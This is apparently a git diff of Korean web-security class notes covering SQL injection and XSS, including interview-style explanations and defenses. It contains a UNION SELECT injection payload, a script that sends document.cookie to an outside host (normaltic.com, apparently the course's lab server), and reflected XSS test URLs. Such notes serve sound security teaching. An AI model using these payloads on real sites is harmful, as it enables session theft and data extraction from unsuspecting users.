@@ -1,3 +1,5 @@
+4주차 수업!!!
+
 <?php
 1’ union select column_name, 2 from information_schema.columns WHERE table_name = ‘admin’ #
 
@@ -116,11 +118,106 @@ SQL Injection 훈련
 2. SQLi 공격 연구 보고서 마무리
 3. SQLi 3 문제 풀기!
 
+?>
+---------------------------------------------------------------------
+
+5주차 수업
+<?php
+면접질문
+
+SQL Injection
+- What / 무엇인지
+> 공격자가 임의의 SQL 쿼리를 삽입해 서버 측에서 실행되는 SQL 쿼리가 공격자의 의도대로 변조되는 공격
+
+- WHERE / 어디에서 발생하는지
+> 사용자의 입력값(parameter)을 SQL 질의문에 사용하는 페이지.
+
+- Why / 왜 일어나는지
+> 사용자의 입력값을 SQL 질의문에 직접 삽입해서 사용하기 때문에.
+
+- Scenario / 뭘 할 수 있는지
+> DB 데이터 추출
+> DB 데이터 변조
+update, delete, insert
+> 인증 우회
+> WEB SHELL UPLOAD
+- web, was, db가 한 서버에 구축되어있을 경우 가능
+
+- Defense / 어떻게 막는지
+(1) Prepared statement
+(2) 화이트 리스트 기반 필터링 / Prepared 안먹히는 곳 / order by, table 이름, column 이름
+
+--------------------------------------------------------------------------------
+
+XSS (Cross-Site Scripting): 크사, 크스스
+"Java Script 공부!!", DVWA
+
++ Server Side Script VS Client Side Script(html, "java", css)
+alert(1)
+
+개념 : 클라이언트 측 스크립트(Java)를 삽입하는 공격 / (WEB)브라우저
+> "공격자의 스크립트가 그대로 서버에서 응답되기 때문"
+
+ex) : <script>session, cookie</script>
+
+발생위치 : 파라미터 데이터가 응답에 포함되는 모든 곳!
+> 영원한 우리의 친구? / Reflected XSS
+
+- 스크립트 삽입 전략
+1. 서버에 저장 - Stroed XSS
+2. 서버에서 반사 - Refelected XSS
+3. 클라이언트 조립 - DOM Based XSS
+
+-----------------------------
+- Reflected XSS
+> 검색기능
+스크립트 포함한 링크를 통해 공격 수행
+사회공학기법 활용, GET방식이어야 가능 Post에서 전환 불가능시 X
+
+Tip: params 포함, 응답에 입력값 포함되어있는지, 리피터에서 응답위치 확인, 톱니(Auto scroll)
+<"'> / <script></script> 필터링 확인, URL 카피"
+
+--------------------------------------------------------
+- Dom Based XSS : 클라이언트 측에서 조립
+> 서버응답x, 서버저장x
+-- document.write(사용자의 파라미터) / url에 삽입?
+링크를 통해서 공격 수행
+
+---------------------------------------------------------
+XSS - Session ID
+> Javascript
+-- document.cookie ->
+
+WEB Server
+access log
+
+<script>document.write('<img src="http://normaltic.com/?'+document.cookie+'"/>');</script>
+
+<script>alert("Reflected")</script>
+
+
+"과   제"
+1. XSS 복습
+- stored XSS, Reflected XSS
+
+Stored XSS : http://normaltic.com:1018/xss_1/notice_update.php?id=178
+Relfected XSS : http://normaltic.com:1018/xss_2/notice_update.php?id=60"/><script>alert('XSS')</script>
+
+alert('XSS')
+
+2. 웹 개발
+
+3. 보고서
+
+다음시간
+1. XSS 실전 해킹 - 여러가지 시나리오
+2. CTF - Session ID 탈취 방법
 
 
 
 
 
+ ?>
 
 
 
